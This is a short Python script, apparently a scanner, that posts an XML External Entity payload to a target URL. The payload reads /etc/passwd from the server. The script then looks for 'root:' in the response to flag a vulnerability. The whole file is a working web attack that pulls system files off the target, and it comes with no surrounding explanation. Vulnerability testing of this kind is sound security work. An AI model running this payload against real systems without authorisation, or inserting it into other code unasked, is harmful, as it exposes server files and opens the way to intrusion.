import requests

def scan_xxe(url):
    payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>"""
    
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(url, data=payload, headers=headers)
    
    if "root:" in response.text:
        print("[!] Potential XXE vulnerability detected.")
        return True
    print("[+] No XXE vulnerabilities detected.")
    return False
